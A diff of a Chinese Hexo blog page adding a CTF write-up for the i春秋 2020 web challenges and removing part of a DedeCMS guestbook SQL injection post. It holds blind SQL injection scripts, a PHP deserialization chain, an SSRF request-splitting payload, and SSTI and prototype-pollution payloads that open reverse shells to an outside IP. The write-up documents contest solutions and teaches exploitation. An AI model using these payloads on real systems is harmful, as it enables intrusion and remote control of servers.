@@ -66,6 +66,610 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-i春秋2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/" class="article-date">
+  <time class="dt-published" datetime="2020-02-26T14:02:00.620Z" itemprop="datePublished">2020-02-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/26/i%E6%98%A5%E7%A7%8B2020/">i春秋2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>sqlmap直接出来</p>
+<p>flag{2f52809e-f46c-4638-8f72-b24ec1ec6d06}</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤<code>union,&lt;,&gt;,=</code></p>
+<p>构造<code>http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1 and if(hex(substr(fl4g,1,1))-1,sleep(5),0)</code></p>
+<pre><code class="python">import requests
+
+&#39;http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1%20and%20if(hex(substr(fl4g,POS,1))-GUESS,sleep(5),0)&#39;
+result=&quot;666c61677b32363837656433302d356266382d343033662d383732342d61643239&quot;
+l=len(result)
+while True:
+    ended=True
+    l+=1
+    for i in range(16):
+        sql=&#39;http://ecd3dce145d342fd9d490cde15ef8239b1e8b5763640437a.changame.ichunqiu.com/?id=0%2bif(conv(substr(hex(fl4g),POS,1),16,10)-GUESS,1,sleep(5))&#39;
+        sql=sql.replace(&quot;POS&quot;,str(l))
+        sql=sql.replace(&quot;GUESS&quot;,str(i))
+        try:
+            requests.get(sql,timeout=5)
+            print(sql)
+        except :
+            result+=hex(i)[2:]
+            print(result)
+            ended=False
+            break
+    if ended:
+        break
+</code></pre>
+<h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>黑名单:<code>union.*select,or,in</code></p>
+<p>因为盲注太麻烦,所以想用preg回溯次数来绕过,但是没用,最后也只能盲注了</p>
+<p>用<code>0 ^ (1=0)</code>来盲注,因为过滤了<code>in</code>所以用sys系统库来绕过(<code>https://xz.aliyun.com/t/7169#toc-53</code>)</p>
+<p><code>0 ^ (select substr(hex(group_concat(table_name)),1,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)</code></p>
+<p>获取表名之后,还有一个难点就是,列名的获取,但是获取列名会用到<code>in</code>字符</p>
+<p>因此考虑,无列名注入<code>union select</code>那个肯定不行</p>
+<p>我们利用<code>((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>来获取flag</p>
+<p>当我们利用这个时,我们必须保证某一个相等,才能通过另外一个判断flag</p>
+<p>有一点要注意的是</p>
+<pre><code>mysql&gt; select &#39;f&#39;=&#39;F&#39;;
++---------+
+| &#39;f&#39;=&#39;F&#39; |
++---------+
+|       1 |
++---------+</code></pre><p>用这种方法是无法区分大小写的,所幸这次比赛的flag都是小写</p>
+<p>脚本</p>
+<pre><code class="python">import requests
+import string
+
+sql=&quot;1 ^ ((select substr(hex(group_concat(table_name)),POS,1) from (SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database() GROUP BY table_name)a)=GUESS)&quot;
+#f1ag_1s_h3r3_hhhhh,users233333333333333
+result=&quot;&quot;
+# l=len(result)
+# while True:
+#     l+=1
+#     ended=True
+#     for i in string.printable:
+#         sql=&quot;1 ^ ((select 0,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
+#         sql=sql.replace(&quot;POS&quot;,str(l))
+#         sql=sql.replace(&quot;GUESS&quot;,(result+i).encode(&quot;hex&quot;).upper())
+#         res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
+#         print(sql)
+#         if &quot;Hello Nu1L&quot; in res.text:
+#             result+=i
+#             print(result)
+#             ended=False
+#             break
+#     if ended:
+#         break
+
+#FLAG{9AD0BB6D-634F-4AEC-9DD8-B617774CD334}
+l=len(result)
+while True:
+    l+=1
+    ended=True
+    for j in range(32,128):
+        i=chr(j)
+        sql=&quot;0 ^ ((select 1,GUESS)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;
+        sql=sql.replace(&quot;POS&quot;,str(l))
+        sql=sql.replace(&quot;GUESS&quot;,&#39;0x&#39;+(result+i).encode(&quot;hex&quot;).upper())
+        res=requests.post(&quot;http://c957eb4253fb4275856dc45eb06d11ab05103bcf405348ab.changame.ichunqiu.com/index.php&quot;,data={&quot;id&quot;:sql})
+        print(sql)
+        if &quot;Hello Nu1L&quot; in res.text:
+            result+=chr(ord(i)-1)
+            print(result)
+            ended=False
+            break
+    if ended:
+        break
+</code></pre>
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code>class info:__call 
+public function __call($name,$argument){//反序列化
+        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
+    }</code></pre><p>flag在flag.php中</p>
+<p>文件读取点:</p>
+<pre><code class="php">class User
+public function __destruct(){//任意读
+        return file_get_contents($this-&gt;nickname);//危
+    }</code></pre>
+<pre><code class="php">if($_SESSION[&#39;login&#39;]===1){
+    require_once(&quot;flag.php&quot;);
+    echo $flag;
+}</code></pre>
+<p>现在有两种思路:</p>
+<ol>
+<li>反序列化读取文件</li>
+<li>sql注入拿到管理原密码,来读取文件(x)</li>
+</ol>
+<p>无论想干啥都得先登陆,但是不知道咋登陆</p>
+<p>考虑反序列化</p>
+<p>如果我们成功登陆,攻击入口就是update.php</p>
+<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
+    echo &quot;你还没有登陆呢！&quot;;
+}
+$users=new User();
+$users-&gt;update();
+if($_SESSION[&#39;login&#39;]===1){
+    require_once(&quot;flag.php&quot;);
+    echo $flag;
+}
+</code></pre>
+<p>比较奇怪的是,按我所知,想要反序列化就要登陆,登陆的话他们就自己打出flag了,所以没有反序列化的必要?</p>
+<p>认真看下好像没有die</p>
+<pre><code class="php">if ($_SESSION[&#39;login&#39;]!=1){
+    echo &quot;你还没有登陆呢！&quot;;
+}</code></pre>
+<p>反序列化的起点是:<code>$Info=unserialize($this-&gt;getNewinfo());</code></p>
+<p>终点是:</p>
+<pre><code class="php">class user
+public function __destruct(){//任意读
+        return file_get_contents($this-&gt;nickname);//危
+    }</code></pre>
+<p>或</p>
+<pre><code class="php">class Info
+public function __call($name,$argument){//反序列化
+        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
+    }</code></pre>
+<p>因为<code>__destruct</code>的数据不知道怎么拿出来,我先考虑sql注入</p>
+<p>如果,老老实实让他们序列化<code>Info</code>,好像啥都干不了</p>
+<p>想办法利用<code>safe</code>函数在<code>Info</code>里面插个类,插个<code>UpdateHelper</code>然后利用其<code>__destruct</code>方法调用<code>User</code>的<code>__toString</code>函数,</p>
+<p>再调用<code>login</code>方法,最后执行sql语句</p>
+<pre><code class="php">function safe($parm){
+    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
+    return str_replace($array,&#39;hacker&#39;,$parm);
+}
+class User{
+    public function update(){
+        $Info=unserialize($this-&gt;getNewinfo());
+        $age=$Info-&gt;age;
+        $nickname=$Info-&gt;nickname;
+        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);
+        //这个功能还没有写完 先占坑
+    }
+    public function getNewInfo(){
+            $age=$_POST[&#39;age&#39;];
+            $nickname=$_POST[&#39;nickname&#39;];
+            return safe(serialize(new Info($age,$nickname)));
+        }
+    public function __destruct(){//任意读
+            return file_get_contents($this-&gt;nickname);//危
+        }
+    public function __toString()
+    {
+        $this-&gt;nickname-&gt;update($this-&gt;age);
+        return &quot;0-0&quot;;
+    }
+}</code></pre>
+<pre><code class="php">Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+    public function __construct($newInfo,$sql){
+        $newInfo=unserialize($newInfo);
+        $upDate=new dbCtrl();
+    }
+    public function __destruct()
+    {
+        echo $this-&gt;sql;
+    }
+}</code></pre>
+<p>脚本:</p>
+<pre><code class="php">&lt;?php
+Class UpdateHelper{
+    public $id=0;
+    public $newinfo=&quot;&quot;;
+    public $sql;
+    public function __construct($sql){
+        $this-&gt;sql=$sql;
+    }
+//    public function __destruct()
+//    {
+//        echo $this-&gt;sql;
+//    }
+}
+class Info{
+    public $age=&quot;&quot;;
+    public $nickname=&quot;&quot;;
+    public $CtrlCase;
+    public function __construct(){
+        $this-&gt;CtrlCase=new dbCtrl();
+    }
+//    public function __call($name,$argument){//反序列化
+//        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
+//    }
+}
+class dbCtrl
+{
+    public $hostname = &quot;127.0.0.1&quot;;
+    public $dbuser = &quot;noob123&quot;;
+    public $dbpass = &quot;noob123&quot;;
+    public $database = &quot;noob123&quot;;
+//    public $hostname = &quot;127.0.0.1&quot;;
+//    public $dbuser = &quot;root&quot;;
+//    public $dbpass = &quot;123456&quot;;
+//    public $database = &quot;test&quot;;
+    public $name=&quot;admin&quot;;
+    public $password=&quot;1&quot;;
+    public $mysqli;
+    public $token;
+}
+class User
+{
+    public $id=0;
+    public $age;
+    public $nickname;
+    public function __construct()
+    {
+        $this-&gt;nickname=new Info();
+        $this-&gt;age=&#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#39;;
+    }
+}
+function escape($str)
+{
+    $evil=&#39;&#39;;
+    $len=strlen($str)+2;
+    if($len%2)
+    {
+        $evil.=&quot;union&quot;;
+        $len-=1;
+    }
+    $len/=2;
+    while($len)
+    {
+        $evil.=&quot;load&quot;;
+        $len-=1;
+    }
+    return $evil.&#39;&quot;;&#39;.$str;
+
+}
+$call__tostring=new UpdateHelper(new User());
+$ser= urlencode(serialize($call__tostring));
+echo urlencode(escape(&quot;s:8:\&quot;CtrlCase\&quot;;&quot;.urldecode($ser).&#39;;};&#39;));
+</code></pre>
+<p><code>flag{7989f259-3281-4c1c-8939-dc8bc0b5375b}</code></p>
+<h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><pre><code class="php">&lt;?php 
+    function check($str)
+    {
+        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))
+        {
+            print_r($matches);
+            return 0;
+        }
+        else
+        {
+            return 1;
+        }
+    }
+    try
+    {
+        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);
+    } 
+    catch(Exception $e)
+    {
+        echo $e-&gt;getMessage();
+    }
+    if(isset($_GET[&#39;id&#39;]))
+    {
+        $id = $_GET[&#39;id&#39;];
+    }
+    else
+    {
+        $test = $db-&gt;query(&quot;select balabala from table1&quot;);
+        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
+        $id = $res[&#39;balabala&#39;];
+    }
+    if(check($id))
+    {
+        $query = &quot;select balabala from table1 where 1=?&quot;;
+        $db-&gt;query(&quot;set names gbk&quot;);
+        $row = $db-&gt;prepare($query);
+        $row-&gt;bindParam(1,$id);
+        $row-&gt;execute();
+    }</code></pre>
+<p>利用宽字节来逃出引号包围,payload:<code>%bf%27;</code></p>
+<p>但是没有找到有效的sql时间盲注语句,正则来延时也没用,加上select被过滤,</p>
+<p>我缺少了一个关键的知识</p>
+<p>在学长的提示下,被认为不可以堆叠注入的pdo居然可以(我哪来的认知????)</p>
+<p>然后就简单了</p>
+<pre><code>set @t=0x73656C65637420736C65657028313029;PREPARE sqla from @t;EXECUTE sqla;</code></pre><p>python脚本</p>
+<pre><code class="python">import requests
+def sql_inj(sql):
+    sql=&quot;0x&quot;+sql.encode(&quot;hex&quot;)
+    tpl=&quot;set @t=TGT;PREPARE sqla from @t;EXECUTE sqla;&quot;.replace(&quot;TGT&quot;,sql)
+    url=&quot;http://b0ae8f49254247b8815616a4711941f17f2a145a8a374167.changame.ichunqiu.com/&quot;
+    param={
+        &quot;id&quot;:&quot;\xbf\x27;&quot;+tpl
+    }
+    requests.get(url,params=param,timeout=2)
+
+#696E666F726D6174696F6E5F736368656D612C6D7973716C2C70646F746573742C706572666F726D616E63655F736368656D61
+#table1
+#balabala,eihey,fllllll4g,bbb
+result=&quot;&quot;
+count=1+len(result)
+while True:
+    lock=0
+    for i in &quot;0123456789ABCDEF&quot;:
+        #UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;tablename&#39;
+        try :
+            sql=&quot;select if(substr(hex(group_concat(COL)),POS,1)=&#39;GUESS&#39;,sleep(3),0) from TABLE WHERE&quot;.replace(&quot;COL&quot;,&quot;fllllll4g&quot;)
+            sql=sql.replace(&quot;GUESS&quot;,i).replace(&quot;TABLE&quot;,&quot;table1&quot;)
+            sql=sql.replace(&quot;WHERE&quot;,&quot;&quot;)
+            sql=sql.replace(&quot;POS&quot;,str(count))
+            sql_inj(sql)
+            print(sql)
+
+        except :
+            result+=i
+            print(result)
+            lock=1
+            break
+    if not lock:
+        break
+    count+=1
+</code></pre>
+<h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>这题让我学到一个骚操作和看到一篇好文章</p>
+<pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>利用堆叠注入查询</p>
+<pre><code>array(1) {
+  [0]=&gt;
+  string(8) &quot;FlagHere&quot;
+}
+
+array(1) {
+  [0]=&gt;
+  string(5) &quot;words&quot;
+}</code></pre><pre><code>1&#39;;show create table words;#
+array(2) {
+  [0]=&gt;
+  string(5) &quot;words&quot;
+  [1]=&gt;
+  string(114) &quot;CREATE TABLE `words` (
+  `id` int(10) NOT NULL,
+  `data` varchar(20) NOT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
+}
+
+
+1&#39;;show create table FlagHere;#
+array(2) {
+  [0]=&gt;
+  string(8) &quot;FlagHere&quot;
+  [1]=&gt;
+  string(93) &quot;CREATE TABLE `FlagHere` (
+  `flag` varchar(100) NOT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot;
+}</code></pre><p>利用handler来读取数据</p>
+<p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p>
+<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p><code>2</code></p>
+<p>过滤<code>import,os</code></p>
+<pre><code>{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')}}
+{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()}}
+{{''|attr('_'+'_class_'+'_')|attr('_'+'_ba'+'se_'+'_')|attr('__subcl'+'asses__')()|attr('__dict__')}}
+{{config.__class__.__mro__[1].__subclasses__()[-2].__init__.__globals__['o'+'s'].__dict__['sys'+'tem']('echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjM5LjEwOC4xNjQuMjE5Iiw2MDAwMykpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p|base'+'64 -d | python')}}</code></pre><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p> <a href="https://github.com/nodejs/node/issues/13296" target="_blank" rel="noopener">https://github.com/nodejs/node/issues/13296</a> </p>
+<p> <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</a> </p>
+<p>这题有个upload函数</p>
+<pre><code class="javascript">app.post(&#39;/file_upload&#39;, function(req, res){
+    var ip = req.connection.remoteAddress;
+    var obj = {
+        msg: &#39;&#39;,
+    }
+    if (!ip.includes(&#39;127.0.0.1&#39;)) {
+        obj.msg=&quot;only admin&#39;s ip can use it&quot;
+        res.send(JSON.stringify(obj));
+        return 
+    }
+    fs.readFile(req.files[0].path, function(err, data){
+        if(err){
+            obj.msg = &#39;upload failed&#39;;
+            res.send(JSON.stringify(obj));
+        }else{
+            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
+            var file_name = req.files[0].originalname
+            var dir_file = __dirname + file_path + file_name
+            if(!fs.existsSync(__dirname + file_path)){
+                try {
+                    fs.mkdirSync(__dirname + file_path)
+                } catch (error) {
+                    obj.msg = &quot;file type error&quot;;
+                    res.send(JSON.stringify(obj));
+                    return
+                }
+            }
+            try {
+                fs.writeFileSync(dir_file,data)
+                obj = {
+                    msg: &#39;upload success&#39;,
+                    filename: file_path + file_name
+                } 
+            } catch (error) {
+                obj.msg = &#39;upload failed&#39;;
+            }
+            res.send(JSON.stringify(obj));    
+        }
+    })
+})</code></pre>
+<p>但是需要本地访问</p>
+<p>有一个ssrf的点:</p>
+<pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {
+    var q = req.query.q;
+    var resp = &quot;&quot;;
+    if (q) {
+        var url = &#39;http://localhost:8081/source?&#39; + q
+        var trigger = blacklist(url);
+        if (trigger === true) {
+            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
+        } else {
+            try {
+                http.get(url, function(resp) {
+                    resp.setEncoding(&#39;utf8&#39;);
+                    resp.on(&#39;error&#39;, function(err) {
+                    if (err.code === &quot;ECONNRESET&quot;) {
+                     console.log(&quot;Timeout occurs&quot;);
+                     return;
+                    }
+                   });
+
+                    resp.on(&#39;data&#39;, function(chunk) {
+                        try {
+                         resps = chunk.toString();
+                         res.send(resps);
+                        }catch (e) {
+                           res.send(e.message);
+                        }
+
+                    }).on(&#39;error&#39;, (e) =&gt; {
+                         res.send(e.message);});
+                });
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    } else {
+        res.send(&quot;search param &#39;q&#39; missing!&quot;);
+    }
+})</code></pre>
+<p>我们利用nodejs 8及之前的<code>utf-8</code>转<code>latin1</code>的漏洞来进行ssrf</p>
+<pre><code>&gt; http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output
+[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p>payload:</p>
+<pre><code class="python">import hashlib
+from urllib.parse import quote, unquote
+import requests
+import socket                                                                                                          
+
+file=&#39;&#39;&#39;------WebKitFormBoundaryVneK8P7cpLasJSn8
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;
+Content-Type: ../template
+
+doctype html
+html
+  head
+
+  body
+    include ../../../../../../flag.txt
+------WebKitFormBoundaryVneK8P7cpLasJSn8--
+&#39;&#39;&#39;.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
+body=&#39;&#39;&#39; HTTP/1.1
+Host: x
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Host: x
+Content-Length: %d
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVneK8P7cpLasJSn8
+Connection: keep-alive
+
+%s
+GET /core HTTP/1.1
+Host: x
+Connection: keep-alive
+x:&#39;&#39;&#39; %(len(file),file)
+body=body.replace(&quot;\r\n&quot;,&quot;\n&quot;).replace(&quot;\n&quot;,&quot;\r\n&quot;)
+uni = { 
+    &#39;/&#39;: quote(&#39;\u012f&#39;.encode(&#39;utf-8&#39;)),
+    &#39; &#39;: quote(&#39;\u0120&#39;.encode(&#39;utf-8&#39;)),
+    &#39;\n&#39;: quote(&#39;\u010a&#39;.encode(&#39;utf-8&#39;)),
+    &#39;\r&#39;: quote(&#39;\u010d&#39;.encode(&#39;utf-8&#39;)),
+    &#39;&quot;&#39;: quote(&#39;\u0122&#39;.encode(&#39;utf-8&#39;)),
+    &quot;&#39;&quot;: quote(&#39;\u0127&#39;.encode(&#39;utf-8&#39;)),
+    &#39;!&#39;: quote(&#39;\u0121&#39;.encode(&#39;utf-8&#39;)),
+    &#39;o&#39;: quote(&#39;\u016f&#39;.encode(&#39;utf-8&#39;)),
+    &#39;e&#39;: quote(&#39;\u0165&#39;.encode(&#39;utf-8&#39;)),
+}
+print(uni)
+host=&quot;&quot;
+payload = &#39;%s&#39; % body
+for c, encoded in uni.items():
+    payload = payload.replace(c, encoded)
+print(payload)
+requests.get(&quot;http://123.57.212.112:33321/core?q=&quot;+payload)
+</code></pre>
+<p><code>flag{8ed05e41-c306-4f0f-a958-6759f66890e9}</code></p>
+<h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p><code>https://xz.aliyun.com/t/7184#toc-7</code></p>
+<p><code>https://xz.aliyun.com/t/6113#toc-4</code></p>
+<pre><code>router.post(&#39;/action&#39;, function (req, res) {
+  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)} 
+  req.session.user.data = clone(req.body);
+  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  
+});</code></pre><p>类似js原型链污染的点</p>
+<p>但是需要<code>req.session.user.user==ADMIN</code></p>
+<pre><code class="javascript">router.post(&#39;/login&#39;, function (req, res) {
+  if(req.body.Submit==&quot;register&quot;){
+   if(safeKeyword(req.body.userid)){
+    res.end(&quot;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&quot;) 
+   }
+    req.session.user={
+      &#39;user&#39;:req.body.userid.toUpperCase(),
+      &#39;passwd&#39;: req.body.pwd,
+      &#39;isLogin&#39;:false
+    }
+    res.redirect(&#39;/&#39;); 
+  }
+  else if(req.body.Submit==&quot;login&quot;){
+    if(!req.session.user){res.end(&quot;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&quot;)}
+    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){
+      req.session.user.isLogin=true;
+    }
+    else{
+      res.end(&quot;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&quot;)
+    }
+
+  }
+  res.redirect(&#39;/&#39;); ;
+});
+function safeKeyword(keyword) {
+  if(keyword.match(/(admin)/is)) {
+      return keyword
+  }
+
+  return undefined
+}</code></pre>
+<p>谷歌找到<code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code>,关于<code>toUpperCase</code>的一些特性,来绕过<code>safeKeyword</code></p>
+<p>payload:<code>userid=adm%C4%B1n&amp;pwd=a&amp;action=login&amp;Submit=register</code> | <code>admın</code></p>
+<p>最后污染<code>ejs</code>来拿到flag(<code>https://xz.aliyun.com/t/6113#toc-4</code>)</p>
+<pre><code>{&quot;Submit&quot;:&quot;&quot;,&quot;lud&quot;:1,&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a; global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/39.108.164.219/60003 0&gt;&amp;1\&quot;&#39;);//&quot;}}</code></pre><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p><a href="http://www.zip下载源码" target="_blank" rel="noopener">www.zip下载源码</a></p>
+<p>输入不存在的路径发现是tp6.0.0,刚好有个session直接写的漏洞</p>
+<p>全局搜索session,发现</p>
+<pre><code class="php"> $record = session(&quot;Record&quot;);
+            if (!session(&quot;Record&quot;))
+            {
+                session(&quot;Record&quot;,$data[&quot;key&quot;]);
+            }</code></pre>
+<p>然后getshell</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/26/i春秋2020/">https://explorersss.github.io/2020/02/26/i春秋2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://explorersss.github.io/2020/02/26/i%E6%98%A5%E7%A7%8B2020/" data-id="ck73e1aag0000zwv01vjt9os8" data-title="i春秋2020" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-某misc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/20/%E6%9F%90misc/" class="article-date">
@@ -1619,116 +2223,11 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
 
 
   
-    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="dt-published" datetime="2020-02-10T15:49:48.012Z" itemprop="datePublished">2020-02-10</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
-<ol>
-<li>php magic_quotes_gpc=off</li>
-<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
-</ol>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
-<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
-<pre><code class="php">if($action==&#39;admin&#39;)
-{
-    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);
-    exit();
-}</code></pre>
-<p><code>/plus/guestbook/edit.inc.php</code></p>
-<pre><code class="php">if($job==&#39;editok&#39;)
-{
-    $remsg = trim($remsg);
-    if($remsg!=&#39;&#39;)
-    {
-        //管理员回复不过滤HTML
-        if($g_isadmin)
-        {
-            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg; 
-            //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;
-        }
-        else
-        {
-            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);
-            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;
-            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
-            $msg = $oldmsg.$remsg;
-        }
-    } 
-    $msg = HtmlReplace($msg, -1);
-    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);
-    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
-    exit();
-}</code></pre>
-<p>其中:</p>
-<pre><code class="php">$msg = HtmlReplace($msg, -1);
